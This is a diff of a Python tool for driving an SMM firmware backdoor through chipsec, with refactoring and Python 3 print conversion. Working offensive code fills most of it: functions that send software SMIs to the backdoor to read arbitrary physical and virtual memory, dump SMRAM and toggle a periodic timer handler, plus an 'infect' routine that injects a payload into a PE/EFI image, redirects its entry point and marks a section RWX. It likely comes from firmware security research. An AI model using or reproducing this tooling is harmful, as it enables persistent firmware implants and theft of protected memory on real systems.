@@ -1,10 +1,8 @@
+#!/usr/bin/env python
+
 import sys, os, shutil
 from struct import pack, unpack
 from optparse import OptionParser, make_option
-
-CHIPSEC_TOOL_PATH = '/usr/src/chipsec/source/tool'
-
-sys.path.append(CHIPSEC_TOOL_PATH)
 
 # SW SMI command value for communicating with backdoor SMM code
 BACKDOOR_SW_SMI_VAL = 0xCC
@@ -38,48 +36,77 @@ PAGE_SIZE = 0x1000
 
 cs = None
 
-class Chipsec(object):
+class ChipsecWrapper(object):
 
-    def __init__(self, uefi, mem, ints):
+    def __init__(self):
 
-        self.uefi, self.mem, self.ints = uefi, mem, ints
+        try:
 
-def efi_var_get(name):
+            import chipsec.chipset
+            import chipsec.hal.uefi
+            import chipsec.hal.physmem
+            import chipsec.hal.interrupts
 
-    # parse variable name string of name-GUID format
-    name = name.split('-')
+        except ImportError:
 
-    return cs.uefi.get_EFI_variable(name[0], '-'.join(name[1:]), None)
+            print('ERROR: chipsec is not installed')
+            exit(-1)
 
-efi_var_get_8 = lambda name: unpack('B', efi_var_get(name))[0]
-efi_var_get_16 = lambda name: unpack('H', efi_var_get(name))[0]
-efi_var_get_32 = lambda name: unpack('I', efi_var_get(name))[0]
-efi_var_get_64 = lambda name: unpack('Q', efi_var_get(name))[0]
+        self.cs = chipsec.chipset.cs()
+        
+        # load chipsec helper
+        self.cs.init(None, True)
+    
+        # load needed sumbmodules
+        self.intr = chipsec.hal.interrupts.Interrupts(self.cs)
+        self.uefi = chipsec.hal.uefi.UEFI(self.cs)        
+        self.mem = chipsec.hal.physmem.Memory(self.cs)
 
-def mem_read(addr, size): 
+    def efi_var_get(self, name):
 
-    return cs.mem.read_physical_mem(addr, size)
+        # parse variable name string of name-GUID format
+        name = name.split('-')
 
-mem_read_8 = lambda addr: unpack('B', mem_read(addr, 1))[0]
-mem_read_16 = lambda addr: unpack('H', mem_read(addr, 2))[0]
-mem_read_32 = lambda addr: unpack('I', mem_read(addr, 4))[0]
-mem_read_64 = lambda addr: unpack('Q', mem_read(addr, 8))[0]
+        # get variable data
+        return self.uefi.get_EFI_variable(name[0], '-'.join(name[1: ]), None)
+
+    efi_var_get_8 = lambda self, name: unpack('B', self.efi_var_get(name))[0]
+    efi_var_get_16 = lambda self, name: unpack('H', self.efi_var_get(name))[0]
+    efi_var_get_32 = lambda self, name: unpack('I', self.efi_var_get(name))[0]
+    efi_var_get_64 = lambda self, name: unpack('Q', self.efi_var_get(name))[0]
+
+    def mem_read(self, addr, size): 
+
+        # read memory contents
+        return self.mem.read_physical_mem(addr, size)
+
+    mem_read_8 = lambda self, addr: unpack('B', self.mem_read(addr, 1))[0]
+    mem_read_16 = lambda self, addr: unpack('H', self.mem_read(addr, 2))[0]
+    mem_read_32 = lambda self, addr: unpack('I', self.mem_read(addr, 4))[0]
+    mem_read_64 = lambda self, addr: unpack('Q', self.mem_read(addr, 8))[0]
+
+    def send_sw_smi(self, command, data, arg):
+
+        # fire synchronous SMI
+        self.intr.send_SW_SMI(0, command, data, 0, 0, arg, 0, 0, 0)
 
 def get_backdoor_info_addr():
 
-    return efi_var_get_64(BACKDOOR_INFO_EFI_VAR)
+    # get _BACKDOOR_INFO structure address
+    return cs.efi_var_get_64(BACKDOOR_INFO_EFI_VAR)
 
 def get_backdoor_info(addr = None):
 
     addr = get_backdoor_info_addr() if addr is None else addr
 
-    return unpack(BACKDOOR_INFO_FMT, mem_read(addr, BACKDOOR_INFO_LEN))
+    # read _BACKDOOR_INFO structure contents
+    return unpack(BACKDOOR_INFO_FMT, cs.mem_read(addr, BACKDOOR_INFO_LEN))
 
 def get_backdoor_info_mem(addr = None):
 
     addr = get_backdoor_info_addr() if addr is None else addr
 
-    return mem_read(addr + PAGE_SIZE, PAGE_SIZE)
+    return cs.mem_read(addr + PAGE_SIZE, PAGE_SIZE)
 
 def get_smram_info():
 
@@ -100,8 +127,7 @@ def get_smram_info():
 
             } EFI_SMRAM_DESCRIPTOR;
         '''            
-        physical_start, cpu_start, physical_size, region_state = \
-            unpack('Q' * 4, mem_read(addr, size))            
+        physical_start, cpu_start, physical_size, region_state = unpack('Q' * 4, cs.mem_read(addr, size))            
 
         if physical_start == 0:
 
@@ -113,9 +139,34 @@ def get_smram_info():
 
     return ret
 
-def send_sw_smi(command, data, arg):
+def backdoor_ctl(code, arg):
 
-    cs.ints.send_SW_SMI(0, command, data, 0, 0, arg, 0, 0, 0)
+    # send request to the backdoor
+    cs.send_sw_smi(BACKDOOR_SW_SMI_VAL, code, arg)
+
+def backdoor_read_virt_page(addr):
+
+    # read virtual memory page
+    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_MEM, addr)
+        
+    return get_backdoor_info_mem()
+
+def backdoor_read_phys_page(addr):
+
+    # read physical memory page
+    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_MEM, addr)
+        
+    return get_backdoor_info_mem()
+
+def backdoor_timer_enable():
+
+    # enable periodic timer SMI handler
+    backdoor_ctl(BACKDOOR_SW_DATA_TIMER_ENABLE, 0)
+        
+def backdoor_timer_disable():
+
+    # disable periodic timer SMI handler
+    backdoor_ctl(BACKDOOR_SW_DATA_TIMER_DISABLE, 0)
 
 def dump_mem_page(addr, count = None):
 
@@ -127,7 +178,7 @@ def dump_mem_page(addr, count = None):
 
         # send read memory page command to SMM code
         page_addr = addr + PAGE_SIZE * i
-        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)
+        backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)
 
         _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
         if last_status != 0:
@@ -178,7 +229,7 @@ def dump_smram():
 
         raise(Exception('No SMRAM regions found'))
 
-    print '[+] Dumping SMRAM regions, this may take a while...'
+    print('[+] Dumping SMRAM regions, this may take a while...')
 
     try:
 
@@ -193,7 +244,7 @@ def dump_smram():
             if last_status == BACKDOOR_INFO_FULL:
 
                 # dump region contents from BACKDOOR_INFO structure
-                data = mem_read(info_addr + ptr, region_size)
+                data = cs.mem_read(info_addr + ptr, region_size)
                 ptr += region_size
 
             else:
@@ -208,52 +259,59 @@ def dump_smram():
 
             with open(name, 'wb') as fd:
 
-                print '[+] Creating', name
+                print('[+] Creating %s' % name)
                 fd.write(data) 
 
     except IOError, why:
 
-        print '[!]', str(why)
+        print('ERROR: %s' % str(why))
         return False
 
 def check_system():    
 
     try:
 
-        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_PING, 0x31337)
+        backdoor_ctl(BACKDOOR_SW_DATA_PING, 0x31337)
 
         backdoor_info = get_backdoor_info_addr()
-        print '[+] struct _BACKDOOR_INFO physical address is', hex(backdoor_info) 
+        print('[+] struct _BACKDOOR_INFO physical address is 0x%x' % backdoor_info)
 
         calls_count, ticks_count, last_status, smm_mca_cap, smm_feature_control = \
             get_backdoor_info(addr = backdoor_info)
 
-        print '[+] BackdoorEntry() calls count is %d' % calls_count
-        print '[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count
-        print '[+] Last status code is 0x%.8x' % last_status
-        print '[+] MSR_SMM_MCA_CAP register value is 0x%x' % smm_mca_cap
-        print '[+] MSR_SMM_FEATURE_CONTROL register value is 0x%x' % smm_feature_control
+        print('[+] BackdoorEntry() calls count is %d' % calls_count)
+        print('[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count)
+        print('[+] Last status code is 0x%.8x' % last_status)
+        print('[+] MSR_SMM_MCA_CAP register value is 0x%x' % smm_mca_cap)
+        print('[+] MSR_SMM_FEATURE_CONTROL register value is 0x%x' % smm_feature_control)
 
-        print '[+] SMRAM map:'
+        print('[+] SMRAM map:')
 
         # enumerate available SMRAM regions
         for region in get_smram_info():        
         
             physical_start, physical_size, region_state = region 
 
-            print '    address = 0x%.8x, size = 0x%.8x, state = 0x%x' % \
-                  (physical_start, physical_size, region_state)
+            print('    address = 0x%.8x, size = 0x%.8x, state = 0x%x' % \
+                  (physical_start, physical_size, region_state))
 
         return True
 
     except IOError, why:
 
-        print '[!]', str(why)
+        print('ERROR: %s' % str(why))
         return False
 
 def infect(src, payload, dst = None):
 
-    import pefile
+    try:
+
+        import pefile
+
+    except ImportError:
+
+        print('ERROR: pefile is not installed')
+        exit(-1)
 
     def _infector_config_offset(pe):
         
@@ -313,11 +371,11 @@ def infect(src, payload, dst = None):
     # save original entry point address of target image
     conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint
 
-    print 'Original entry point RVA is 0x%.8x' % conf_ep_old 
-    print 'Original %s virtual size is 0x%.8x' % \
-          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize)
+    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
+    print('Original %s virtual size is 0x%.8x' % \
+          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))
 
-    print 'Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage
+    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)
 
     # write updated _INFECTOR_CONFIG back to the payload image
     data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)
@@ -335,17 +393,17 @@ def infect(src, payload, dst = None):
                                    pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                    pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  
 
-    print 'Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0] 
+    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])
 
     # update image headers
     pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
     pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    
 
-    print 'New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint
-    print 'New %s virtual size is 0x%.8x' % \
-          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize)
+    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
+    print('New %s virtual size is 0x%.8x' % \
+          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))
 
-    print 'New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage
+    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)
 
     # get infected image data
     data = pe_src.write() + data
@@ -392,19 +450,10 @@ def hexdump(data, width = 16, addr = 0):
 
 def chipsec_init():
 
-    global cs
-
-    import chipsec.chipset
-    import chipsec.hal.uefi
-    import chipsec.hal.physmem
-    import chipsec.hal.interrupts
-
-    _cs = chipsec.chipset.cs()
-    _cs.init(None, True)
+    global cs    
     
-    cs = Chipsec(chipsec.hal.uefi.UEFI(_cs),
-                 chipsec.hal.physmem.Memory(_cs),
-                 chipsec.hal.interrupts.Interrupts(_cs))
+    # initialize chipsec
+    cs = ChipsecWrapper()
 
 def main():    
 
@@ -426,16 +475,16 @@ def main():
             help = 'dump SMRAM contents into the file'), 
 
         make_option('--read-phys', dest = 'read_phys', default = None,
-            help = ''),
+            help = 'read physical memory page'),
 
         make_option('--read-virt', dest = 'read_virt', default = None,
-            help = ''),
+            help = 'read virtual memory page'),
 
         make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
-            help = ''),
+            help = 'enable periodic timer SMI handler'),
 
         make_option('--timer-disable', dest = 'timer_disable', action = 'store_true', default = False,
-            help = '')
+            help = 'disable periodic timer SMI handler')
     ]
 
     parser = OptionParser(option_list = option_list)
@@ -445,28 +494,28 @@ def main():
 
         if options.payload is None:
 
-            print '[!] --payload must be specified'
+            print('[!] --payload must be specified')
             return -1
 
-        print '[+] Target image to infect:', options.infect        
-        print '[+] Infector payload:', options.payload
+        print('[+] Target image to infect: %s' % options.infect)
+        print('[+] Infector payload: %s' % options.payload)
 
         if options.output is None:
 
             backup = options.infect + '.bak'
             options.output = options.infect
 
-            print '[+] Backup:', backup
+            print('[+] Backup: %s' % backup)
 
             # backup original file
             shutil.copyfile(options.infect, backup)
 
-        print '[+] Output file:', options.output
+        print('[+] Output file: %s' % options.output)
 
         # infect source file with specified payload
         infect(options.infect, options.payload, dst = options.output) 
 
-        print '[+] DONE'
+        print('[+] DONE')
 
         return 0
 
@@ -489,9 +538,7 @@ def main():
         addr = int(options.read_phys, 16)
 
         chipsec_init()
-        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, addr)
-        
-        print hexdump(get_backdoor_info_mem(), addr = addr)
+        print(hexdump(backdoor_read_phys_page(addr), addr = addr))
 
         return 0
 
@@ -500,29 +547,27 @@ def main():
         addr = int(options.read_virt, 16)
 
         chipsec_init()
-        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_VIRT_MEM, addr)
-        
-        print hexdump(get_backdoor_info_mem(), addr = addr)
+        print(hexdump(backdoor_read_virt_page(addr), addr = addr))
 
         return 0
 
     elif options.timer_enable:
 
         chipsec_init()
-        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_TIMER_ENABLE, 0)
+        backdoor_timer_enable()
         
         return 0
 
     elif options.timer_disable:
 
         chipsec_init()
-        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_TIMER_DISABLE, 0)
+        backdoor_timer_disable()
 
         return 0    
 
     else:
 
-        print '[!] No actions specified, try --help'
+        print('[!] No actions specified, try --help')
         return -1
 
 # def end
